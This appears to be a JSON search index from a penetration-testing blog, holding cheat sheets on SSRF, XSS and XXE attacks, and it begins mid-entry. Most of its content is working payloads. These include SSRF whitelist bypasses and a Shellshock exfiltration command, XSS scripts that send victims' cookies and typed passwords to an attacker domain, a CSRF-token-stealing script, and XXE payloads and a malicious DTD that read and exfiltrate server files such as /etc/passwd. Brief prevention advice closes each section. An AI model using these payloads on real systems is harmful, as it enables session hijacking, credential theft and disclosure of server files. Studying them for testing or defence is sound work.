cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/ssrf/","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Server-side request forgery In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed. ","date":"0001-01-01","objectID":"/posts/penetration_testing/ssrf/:0:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Basics Local server This attack can be perform thanks to the loopback interface. Basicly you will have to find a parameter that fetch or possibly fetch an URL and loopback on the server himself to request the api or whatever. For example with the website fanOfNothing.com, on the page store, the search engine included will pass your search to the api using the following post request : searchFor=fanOfNothing.com:8008/api/search. So your way to access what you want to is to change the fanOfNothing.com:8008/api/search to for example fanOfNothing.com/admin. In that way the result will be the admin page and not the initial response Against another back-end system Basicly the same, just scan for internal APIs and then fuzz endpoint and get result on the search thing ","date":"0001-01-01","objectID":"/posts/penetration_testing/ssrf/:1:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Bypassing filters SSRF with blacklist-based input filter Basicly for this you will need imagination and a good understanding of what you have in front of you. For example if 127.0.0.1 is block you can replace it by 127.1 you can double url encode strings, etc … SSRF with whitelist-based input filter This one is very well explained by portswigger so here is the essentials. To bypass whitelisting you can use thse following techniques : You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host. You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host. You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host. You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can use combinations of these techniques together. SSRF with filter bypass via open redirection vulnerability Same as the previous ones. Here is a payload example : param=http://weliketoshop.net/product/nextProduct?currentProductId=6\u0026path=http://INTERNAL_IP/WHATEVER ","date":"0001-01-01","objectID":"/posts/penetration_testing/ssrf/:2:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"Blind exploitation Blind SSRF with out-of-band detection Easiest blind attack to perform. If you just want to see if SSRF is a thing on the site, bounce back on your domain / IP and tcpdump to check incoming traffic. Blind SSRF with Shellshock exploitation This will principally lead to RCE, you can set the following payload (() { :; }; /usr/bin/nslookup $(COMMAND).YOUR_DOMAIN) on the Web agent field and exploit the SSRF as indicate in previous setps ","date":"0001-01-01","objectID":"/posts/penetration_testing/ssrf/:3:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"How to prevent them You have several way to implement a protection for this type of attack. Here are some of them : Input validation (regex, whitelist, …) If you are using .NET, it can be expose to hex, dword, octal and mixed encoding Ensure that the domain is a trusted and valid one Configure a firewall to explicitly set legitimate flows …. ","date":"0001-01-01","objectID":"/posts/penetration_testing/ssrf/:4:0","tags":["web","penetest","ssrf"],"title":"SSRF attack","uri":"/posts/penetration_testing/ssrf/"},{"categories":["Penetest - Web"],"content":"XSS cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Cross-site scripting Cross-site scripting is used to inject malicious javascript code to user browser. This attack can lead to a total control of the application in use. More details and specific stuff can be found here ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:0:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Basics Exploiting cross-site scripting to steal cookies This part represent the principal use of XSS. Web apps usually use cookies to save and remember sessions. In that way, this attack get the cookie in question and send it back to your own domain so you can easily capture it. There is comon security system used to avoid this attack: The victim might not be logged in. Many applications hide their cookies from JavaScript using the HttpOnly flag. Sessions might be locked to additional factors like the user’s IP address. The session might time out before you’re able to hijack it. Here is an example of that type of XSS: \u003cscript\u003e fetch('https://MYDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); \u003c/script\u003e Exploiting cross-site scripting to capture passwords This technique can be use because of stupid password managers and auto-fill option. Basicly the only thing you have to do is to inject an option in the input label to read data when they are enter. Here is an example : \u003cinput name=username id=username\u003e \u003cinput type=password name=password onchange=\" if(this.value.length)fetch('https://MYDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });\"\u003e Exploiting XSS to perform CSRF XSS can also be used to perform CSRF (more details in the next section). Here is an example payload working with token protection enable: \u003cscript\u003e var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name=\"csrf\" value=\"(\\\\w+)\"/)\\[1\\]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'\u0026email=test@test.com') }; \u003c/script\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:1:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Reflected XSS Reflected XSS is the simplest variety of cross-site scripting. The application receive data in an HTTP request and includes that data within the immediate response in an unsafe way. Nothing is stored in the webapp and the trigger only works when the user click on the link or whatever with this particular payload include. Here are some examples : HTML context with nothing encoded \u003cscript\u003ealert(1)\u003c/script\u003e HTML context with most tags and attributes blocked \u003ciframe src=\"https://WEBSITE/?search=\"\u003e\u003cbody onresize=alert(document.cookie)\u003e\" onload=this.style.width='100px'\u003e HTML context with all tags blocked except custom ones \u003cscript\u003e location = 'https://WEBSITE/?search=\u003cxss+id=x+onfocus=alert(document.cookie) tabindex=1\u003e#x'; \u003c/script\u003e Event handlers and href attributes blocked https://WEBSITE/?search=\u003csvg\u003e\u003ca\u003e\u003canimate+attributeName=href+values=javascript:alert(1)+/\u003e\u003ctext+x=20+y=20\u003eClick me\u003c/text\u003e\u003c/a\u003e Some SVG markup allowed https://WEBSITE/?search=\"\u003e\u003csvg\u003e\u003canimatetransform onbegin=alert(1)\u003e Reflected XSS with AngularJS sandbox escape without strings https://your-lab-id.web-security-academy.net/?search=1\u0026toString().constructor.prototype.charAt%3d\\[\\].join;\\[1\\]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 Reflected XSS with AngularJS sandbox escape and CSP \u003cscript\u003e location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; \u003c/script\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:2:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Stored XSS Stored XSS is an injection in the actual page by any way (message, template injection, input, …). Here are some examples: Stored XSS into anchor href attribute with double quotes HTML-encoded javascript:alert('XSS') Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped \u0026apos;-alert(1)-\u0026apos; ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:3:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"DOM XSS DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment. As the vulnaribility is app specific, there will be no example and you will have to use your brain. ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:4:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"Escape CSP CSP or ‘Content Security Policy ’ is a protection to XSS, clickjacking, code injection and more. CSP can be found on the server answer. You can use a checker to dig in what you have in front of you. As the topic is large again here is a link to understand what the checker gave you ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:5:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"How to prevent them Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input. Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding. Use appropriate response headers. To prevent XSS in HTTP responses that aren’t intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend. Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur. ","date":"0001-01-01","objectID":"/posts/penetration_testing/xss/:6:0","tags":["web","penetest","xss"],"title":"XSS attack","uri":"/posts/penetration_testing/xss/"},{"categories":["Penetest - Web"],"content":"XXE cheatsheet","date":"0001-01-01","objectID":"/posts/penetration_testing/xxe/","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"XML external entity injection XXE is a specific attack against XML application. It can allow an attacker to view files, interact directly with the backend, or other application related to the corrupt one. This attack is perform as an initial vector for SSRF. To check for the vulnerability you will have to intercept the request and change the post data. Post data are used in 99.99% for XML applications. ","date":"0001-01-01","objectID":"/posts/penetration_testing/xxe/:0:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"Basics External entities to retrieve files Simple payload to retrieve a file from the filesystem \u003c!DOCTYPE test \\[ \u003c!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM \"file:///etc/passwd\"\u003e \\]\u003e Perform SSRF attacks As the previous one simple payload, you can adapt the IP by using URL to fetch APIs or whatever \u003c!DOCTYPE test \\[ \u003c!ENTITY xxe SYSTEM \"http://127.0.0.1/\"\u003e \\]\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/xxe/:1:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"Blind XXE Out-of-band interaction In this attack you will use the same payload as for the SSRF combined attack, but you will use your IP to check for inbound traffic. \u003c!DOCTYPE test \\[ \u003c!ENTITY xxe SYSTEM \"YOUR_DOMAIN_OR_IP\"\u003e \\]\u003e Out-of-band interaction via XML parameter entities Same principle and a similar payload but two different test \u003c!DOCTYPE stockCheck \\[\u003c!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM \"YOUR_DOMAIN_OR_IP\"\u003e %xxe; \\]\u003e Exfiltrate data using a malicious external DTD First, DTD is a text file that store XML attributes and elements used by an application. This exfiltration has two phases: You will have to host the DTD file on your website and it should be accessible for external use. This file should contain the following payload: \u003c!ENTITY % file SYSTEM \"file://FILE_PATH_TO_RETRIEVE\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM 'YOURDOMAIN/?log=%file;'\u003e\"\u003e %eval; %exfil; Then exploit as you will do an classical exfiltration but you should specify the DTD file as follow : \u003c!DOCTYPE foo [\u003c!ENTITY % xxe SYSTEM \"DTD_URL\"\u003e %xxe;]\u003e Now you should tcpdump or go to your website logs to view the file you want to retrieve. Retrieve data via error messages This attack has the same action than the external DTD we saw previously. You just need to replace the step 1 payload with the following one: \u003c!ENTITY % file SYSTEM \"file://FILE_PATH_TO_RETRIEVE\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM 'file:///invalid/%file;'\u003e\"\u003e %eval; %exfil; This will throw an error containing the file you specify Retrieve data by repurposing a local DTD For this one you need to find a local DTD on the system. Once you get it you can simply redeclare a function and trigger for example the error based exfiltration. In this example we suppose that the local file is DTD_LOCAL_FILE and the entity inside is called PWNME. The following payload is to include on the XML post data : \u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file://DTD_LOCAL_FILE\"\u003e \u003c!ENTITY % PWNME ' \u003c!ENTITY \u0026#x25; file SYSTEM \"file://FILE_PATH_TO_RETRIEVE\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///nonexistent/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; '\u003e %local_dtd; ]\u003e ","date":"0001-01-01","objectID":"/posts/penetration_testing/xxe/:2:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"Others examples Exploiting XInclude to retrieve files Back to basics, simple efficient payload : \u003cfoo xmlns:xi=\"http://www.w3.org/2001/XInclude\"\u003e\u003cxi:include parse=\"text\" href=\"file://FILE_PATH_TO_RETRIEVE\"/\u003e\u003c/foo\u003e Exploiting XXE via image file upload For this attack you will have to prepare a SVG file containing the following payload and adapt parameters : \u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e\u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file://FILE_PATH_TO_RETRIEVE\" \u003e ]\u003e\u003csvg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\u003ctext font-size=\"16\" x=\"0\" y=\"16\"\u003e\u0026xxe;\u003c/text\u003e\u003c/svg\u003e Then just upload it as an image and you should have the file data in your image display ","date":"0001-01-01","objectID":"/posts/penetration_testing/xxe/:3:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"},{"categories":["Penetest - Web"],"content":"How to prevent them XXE exist due to bad handle of user input or used of dangerous function in used librairie. The best way to prevent them is to include only necessaries functions or remove unnecessaries ones. Import ones to disable are XInclude and external entities resolutions ","date":"0001-01-01","objectID":"/posts/penetration_testing/xxe/:4:0","tags":["web","penetest","xxe"],"title":"XXE attack","uri":"/posts/penetration_testing/xxe/"}]